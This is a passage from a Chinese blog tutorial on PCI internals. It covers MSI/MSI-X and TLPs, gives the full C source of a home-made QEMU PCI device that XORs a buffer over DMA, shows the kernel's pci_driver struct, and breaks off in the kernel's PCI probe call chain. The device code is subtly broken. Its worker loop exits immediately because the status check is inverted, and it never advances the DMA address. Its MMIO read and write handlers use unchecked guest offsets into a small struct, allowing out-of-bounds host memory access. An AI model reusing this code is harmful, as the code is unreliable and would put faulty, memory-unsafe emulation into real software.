href="#II-MSI-x2F-MSI-X-中断" class="headerlink" title="II. MSI&#x2F;MSI-X 中断"></a>II. MSI&#x2F;MSI-X 中断</h3><p><strong>Message Signaled Interrupt</strong> 是一种更为现代化与普遍的 PCI 中断机制，<strong>MSI-eXtend</strong> 则为其升级版，该机制的引入是为了消除 INTx 的边带信号，目前绝大多数 PCIe 设备已不再使用传统的 INTx 中断，而是使用 MSI&#x2F;MSI-X 提交中断请求</p><p>在 PCIe 设备中有着两个 Capability 结构，分别对应 MSI 与 MSI-X，通常一个 PCIe 设备仅会包含其中一个。对于 MSI 而言其 Capability ID 为 5，一共有四种结构，分别对应 32 位与 64 位的 Message 结构，以及对应的带上中断 Masking 的结构</p><p><img src="https://s2.loli.net/2022/08/31/v657FsLHc9Kx2Aq.png" alt="知乎偷的图"></p><p>MSI&#x2F;MSI-X 本质上是通过<strong>向特定的内存区域进行写入</strong>来达到中断触发的效果，当 PCI 设备提交请求时，其向 <code>MSI/MSI-x Capability</code> 结构中的 <code>Message Address</code> 地址（PCI总线域）写入 <code>Message Data</code> 数据，从而产生一个存储器写 TLP，由此向处理器提交存储器写请求</p><p>MSI 仅支持 32 个连续的中断向量，而 MSI-X 支持 2048 个非连续的中断向量，但 MSI-X 的中断向量信息并不像 MSI 那样直接存放在配置空间，而是存放在 MMIO 空间中，通过BIR（Base address Indicator Register）与 BAR 来确定其在 MMIO 中的具体位置</p><p><img src="https://s2.loli.net/2022/08/31/QpYXgx5eKczydkE.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/08/31/EXghx6vUV8S1tdN.png" alt="image.png"></p><p>其结构如下图所示：</p><p><img src="https://s2.loli.net/2022/08/31/a1IuvYtj72lS63K.png" alt="image.png"></p><h2 id="八、Transaction-Layer-Package"><a href="#八、Transaction-Layer-Package" class="headerlink" title="八、Transaction Layer Package"></a>八、Transaction Layer Package</h2><p>上一节我们提到了一个词叫 <code>TLP</code>，这一节我们简要介绍一下这是一个什么东西</p><p>我们首先需要介绍 PCI 设备底层的通信结构，类似于计网的 OSI 七层模型，PCI 总线也可以由下到上划分为 <strong>物理层（Physical Layer）、数据链路层（Data Link Layer）、事务层（Transaction Layer）</strong>，TLP 即 <strong>Transaction Layer Package</strong>：在事务层进行传输的数据包</p><p><img src="https://s2.loli.net/2022/08/31/QVYRUoA4JWbyFZD.png" alt="image.png"></p><h1 id="0x02-Linux-PCI-驱动编写（🕊）"><a href="#0x02-Linux-PCI-驱动编写（🕊）" class="headerlink" title="0x02. Linux PCI 驱动编写（🕊）"></a>0x02. Linux PCI 驱动编写（🕊）</h1><p>有的时候你可能自己手工糊了一个 PCI 设备（？），万分欢喜地想要直接往自家💻的 PCI 插槽上一插就开用了，但是突然发现<strong>并没有一种万能的 PCI 驱动能够直接适配你自己造的 PCI 设备</strong>，那这个时候我们只好自己动手写一个驱动了：）</p><h2 id="〇、QEMU-PCI-设备模拟"><a href="#〇、QEMU-PCI-设备模拟" class="headerlink" title="〇、QEMU PCI 设备模拟"></a>〇、QEMU PCI 设备模拟</h2><p>因为笔者确实没有条件手搓一个 PCI 设备，所以这里只好用 QEMU 来模拟一个，笔者这里实现了一个通过 DMA 提供简单的数据异或功能的 PCI 设备</p><blockquote><p>关于最基础的 QEMU 设备编写、QOM 等，参见<a href="https://arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/#0x03-%E7%AE%80%E6%98%93-QEMU-%E8%AE%BE%E5%A4%87%E7%BC%96%E5%86%99">这里</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * arttnba3 PCI test device</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Copyright (c) 2022 arttnba3</span><br><span class="hljs-comment"> * Author: arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This programme is just a simple pci device,</span><br><span class="hljs-comment"> * which is cerated for my own learning about qemu.</span><br><span class="hljs-comment"> * You can modify and use it freely.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/event_notifier.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/kvm.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_STATUS_INIT = <span class="hljs-number">0</span>,<br>    A3DEV_STATUS_READY,<br>    A3DEV_STATUS_RUNNING,<br>    A3DEV_STATUS_STOPPING,<br><br>    A3DEV_STATUS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_REGS_STATUS = <span class="hljs-number">0</span>,<br>    A3DEV_REGS_INSN,<br><br>    A3DEV_REGS_TYPES,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    A3DEV_INSN_START = <span class="hljs-number">0</span>,<br>    A3DEV_INSN_STOP,<br><br>    A3DEV_INSN_TYPES,<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3EncBufferInfo</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    <span class="hljs-type">dma_addr_t</span> addr;<br>    <span class="hljs-type">uint8_t</span> val;<br>    <span class="hljs-type">uint32_t</span> len;<br>&#125; A3EncBufferInfo;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint64_t</span> regs[A3DEV_REGS_TYPES];<br>    A3EncBufferInfo enc_buf;<br><br>    QemuThread thread;<br>    QemuMutex lock;<br>&#125; A3PCIDevState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">a3dev_worker_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(arg);<br>    <span class="hljs-type">uint8_t</span> cb;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> wlen = <span class="hljs-number">0</span>; wlen &lt; ds-&gt;enc_buf.len; wlen++) &#123;<br>        <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_STOPPING) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pci_dma_read(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>        cb ^= ds-&gt;enc_buf.val;<br>        pci_dma_write(&amp;ds-&gt;parent_obj, ds-&gt;enc_buf.addr, &amp;cb, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf) + addr);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_mmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span> (size) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        *(<span class="hljs-type">uint8_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        *(<span class="hljs-type">uint16_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        *(<span class="hljs-type">uint32_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        *(<span class="hljs-type">uint64_t</span>*)(((<span class="hljs-type">uint8_t</span>*) &amp;ds-&gt;enc_buf ) + addr) = val;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_STATUS:<br>            <span class="hljs-keyword">return</span> ds-&gt;regs[A3DEV_REGS_STATUS];<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    qemu_mutex_lock(&amp;ds-&gt;lock);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> A3DEV_REGS_INSN:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_START:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_READY) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_RUNNING;<br>                qemu_thread_create(&amp;ds-&gt;thread, <span class="hljs-string">&quot;a3dev-worker-thread&quot;</span>, <br>                                    a3dev_worker_thread, ds, <br>                                    QEMU_THREAD_DETACHED);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> A3DEV_INSN_STOP:<br>                <span class="hljs-keyword">if</span> (ds-&gt;regs[A3DEV_REGS_STATUS] != A3DEV_STATUS_RUNNING) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_STOPPING;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    qemu_mutex_unlock(&amp;ds-&gt;lock);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_mmio_ops = &#123;<br>    .read = a3dev_mmio_read,<br>    .write = a3dev_mmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> MemoryRegionOps a3dev_pmio_ops = &#123;<br>    .read = a3dev_pmio_read,<br>    .write = a3dev_pmio_write,<br>    .endianness = DEVICE_LITTLE_ENDIAN,<br>    .valid = &#123;<br>        .max_access_size = <span class="hljs-number">4</span>,<br>        .min_access_size = <span class="hljs-number">1</span>,<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>    .impl = &#123;<br>        .unaligned = <span class="hljs-literal">true</span>,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_pci_realize</span><span class="hljs-params">(PCIDevice *pci_dev, Error **errp)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(pci_dev);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_INIT;<br><br>    memory_region_init_io(&amp;ds-&gt;mmio, OBJECT(ds), &amp;a3dev_mmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-mmio&quot;</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    pci_register_bar(pci_dev, <span class="hljs-number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;ds-&gt;mmio);<br>    memory_region_init_io(&amp;ds-&gt;pmio, OBJECT(ds), &amp;a3dev_pmio_ops,<br>                        pci_dev, <span class="hljs-string">&quot;a3dev-pmio&quot;</span>, A3DEV_REGS_TYPES);<br>    pci_register_bar(pci_dev, <span class="hljs-number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;ds-&gt;pmio);<br><br>    <span class="hljs-built_in">memset</span>(&amp;ds-&gt;enc_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ds-&gt;enc_buf));<br>    qemu_mutex_init(&amp;ds-&gt;lock);<br><br>    ds-&gt;regs[A3DEV_REGS_STATUS] = A3DEV_STATUS_READY;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_instance_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br>    PCIDeviceClass *pci = PCI_DEVICE_CLASS(oc);<br><br>    pci-&gt;realize = a3dev_pci_realize;<br>    pci-&gt;vendor_id = PCI_VENDOR_ID_QEMU;<br>    pci-&gt;device_id = <span class="hljs-number">0x1919</span>;<br>    pci-&gt;revision = <span class="hljs-number">0x81</span>;<br>    pci-&gt;class_id = PCI_CLASS_OTHERS;<br><br>    dc-&gt;desc = <span class="hljs-string">&quot;arttnba3 test PCI device&quot;</span>;<br>    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3dev_type_info = &#123;<br>    .name = TYPE_A3DEV_PCI,<br>    .parent = TYPE_PCI_DEVICE,<br>    .instance_init = a3dev_instance_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCIDevClass),<br>    .class_init = a3dev_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3dev_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    type_register_static(&amp;a3dev_type_info);<br>&#125;<br><br>type_init(a3dev_register_types);<br></code></pre></td></tr></table></figure><h2 id="一、kernel-识别-PCI-设备的方式"><a href="#一、kernel-识别-PCI-设备的方式" class="headerlink" title="一、kernel 识别 PCI 设备的方式"></a>一、kernel 识别 PCI 设备的方式</h2><h3 id="I-基本结构"><a href="#I-基本结构" class="headerlink" title="I.基本结构"></a>I.基本结构</h3><p>我们首先来看 Linux kernel 中的通用设备驱动模型，主要由三部分组成：<strong>总线（bus）、设备（device）、驱动（driver）</strong>，具体的总线类型都是基于这一套机制去实现的</p><p><img src="https://s2.loli.net/2022/09/01/ypQ8KYmIzbZkaUd.png" alt="偷的图"></p><p>对于 PCI 而言，总线中的各个组件在 Linux kernel 中对应的结构体如下图所示：</p><p><img src="https://s2.loli.net/2022/09/01/JtUKnCN7d1BWpxz.png" alt="偷的图"></p><p>下面是一张更加详细的展开图：</p><p><img src="https://s2.loli.net/2022/09/01/y5if1YWOesXJbT3.png" alt="偷的图"></p><p>上面的图只画出了 PCI 的总线（<code>struct pci_bus</code>）与 PCI 设备（<code>struct pci_dev</code>），还少了一个驱动结构，在内核中 PCI 驱动对应的实际上是 <code>pci_driver</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_driver</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">node</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>*name;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_device_id</span> *<span class="hljs-title">id_table</span>;</span><span class="hljs-comment">/* Must be non-NULL for probe to be called */</span><br><span class="hljs-type">int</span>  (*probe)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> pci_device_id *id);<span class="hljs-comment">/* New device inserted */</span><br><span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device removed (NULL if not a hot-plug capable driver) */</span><br><span class="hljs-type">int</span>  (*suspend)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">pm_message_t</span> state);<span class="hljs-comment">/* Device suspended */</span><br><span class="hljs-type">int</span>  (*resume)(<span class="hljs-keyword">struct</span> pci_dev *dev);<span class="hljs-comment">/* Device woken up */</span><br><span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> pci_dev *dev);<br><span class="hljs-type">int</span>  (*sriov_configure)(<span class="hljs-keyword">struct</span> pci_dev *dev, <span class="hljs-type">int</span> num_vfs); <span class="hljs-comment">/* On PF */</span><br><span class="hljs-type">int</span>  (*sriov_set_msix_vec_count)(<span class="hljs-keyword">struct</span> pci_dev *vf, <span class="hljs-type">int</span> msix_vec_count); <span class="hljs-comment">/* On PF */</span><br>u32  (*sriov_get_vf_total_msix)(<span class="hljs-keyword">struct</span> pci_dev *pf);<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_error_handlers</span> *<span class="hljs-title">err_handler</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">groups</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">attribute_group</span> **<span class="hljs-title">dev_groups</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device_driver</span><span class="hljs-title">driver</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pci_dynids</span><span class="hljs-title">dynids</span>;</span><br><span class="hljs-type">bool</span> driver_managed_dma;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="II-识别过程"><a href="#II-识别过程" class="headerlink" title="II.识别过程"></a>II.识别过程</h3><p>讲完了基本结构，现在我们可以来看内核是怎么去识别 PCI 设备的了，在内核启动后各架构的初始化函数最终都会调用到 <code>start_kernel()</code>，于是存在如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">start_kernel</span>()<br><span class="hljs-built_in">arch_call_rest_init</span>()<br><span class="hljs-built_in">rest_init</span>()<span class="hljs-comment">// 启动三个进程 idle（0）、kernel_init（1）、kthreadd（2）</span><br><span class="hljs-built_in">kernel_init</span>()<br><span class="hljs-built_in">kernel_init_freeable</span>()<br><span class="hljs-built_in">do_basic_setup</span>()<br><span class="hljs-built_in">driver_init</span>()<br><span class="hljs-built_in">devtmpfs_init</span>()<span class="hljs-comment">// 建立 devtmpfs，之后会被用户态init挂到/dev下面</span><br><span class="hljs-built_in">buses_init</span>()<span class="hljs-comment">// 在 sysfs 根下建立 bus 目录</span><br></code></pre></td></tr></table></figure><p>之后就是到各个模块的 init 函数，按照编译链接顺序，我们所关心的 PCI 相关函数的执行顺序应当如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span 